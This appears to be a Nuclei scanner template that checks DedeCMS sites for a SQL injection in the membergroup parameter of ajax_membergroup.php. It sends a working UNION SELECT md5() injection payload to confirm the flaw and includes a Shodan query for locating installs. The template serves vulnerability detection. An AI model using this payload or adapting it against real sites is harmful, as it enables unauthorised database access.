id: dedecms-membergroup-sqli

info:
  name: Dede CMS - SQL Injection
  author: pikpikcu
  severity: high
  description: DedeCMS contains a SQL injection vulnerability which allows remote unauthenticated users to inject arbitrary SQL statements via the ajax_membergroup.php endpoint and the membergroup parameter.
  reference:
    - http://www.dedeyuan.com/xueyuan/wenti/1244.html
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-89
  metadata:
    shodan-query: http.html:"DedeCms"
  tags: sqli,dedecms

variables:
  num: "999999999"

requests:
  - method: GET
    path:
      - "{{BaseURL}}/member/ajax_membergroup.php?action=post&membergroup=@`'`/*!50000Union+*/+/*!50000select+*/+md5({{num}})+--+@`'`"

    matchers-condition: and
    matchers:

      - type: word
        words:
          - '{{md5({{num}})}}'
        part: body

      - type: status
        status:
          - 200

